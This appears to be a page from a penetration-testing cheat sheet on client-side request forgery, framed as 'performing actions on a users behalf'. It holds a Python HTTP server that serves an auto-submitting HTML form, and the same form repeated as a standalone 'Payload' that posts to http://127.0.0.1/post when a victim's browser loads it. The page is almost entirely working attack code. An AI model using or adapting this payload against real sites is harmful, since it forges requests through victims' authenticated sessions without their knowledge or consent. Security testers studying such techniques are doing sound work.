---
description: Performing actions on a users behalf
---

# Client Side Request Forgery

## Implementing your own response \(POST/Javascript\)

Convenient method when a post request is required.

> This will only work if the target automatically executes Javascript after it is requested by the victim

**Python HTTP server example**

In this example the attacker server will retrieve a GET request and perform POST request to http://127.0.0.1/post

```text
from http.server import HTTPServer, BaseHTTPRequestHandler


class pyhandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(bytes("""
        <html>
            <form id="evilform" action="http://127.0.0.1/post" method="post">
                <!--input name="test" value="evil" /-->
            </form>
            <script>
                document.forms["evilform"].submit();
            </script>
        </html>
        """, 'utf-8'))


class pyhttp(object):
    def __init__(self, server_class=HTTPServer, 
                 handler_class=pyhandler):
        self.address = server_address = ('', 80)
        self.httpd = server_class(server_address, handler_class)
        self.httpd.serve_forever()


pyhttp()
```

**Payload**

```text
<html>
    <form id="evilform" action="http://127.0.0.1/post" method="post">
        <!--input name="test" value="evil" /-->
    </form>
    <script>
        document.forms["evilform"].submit();
    </script>
</html>
```

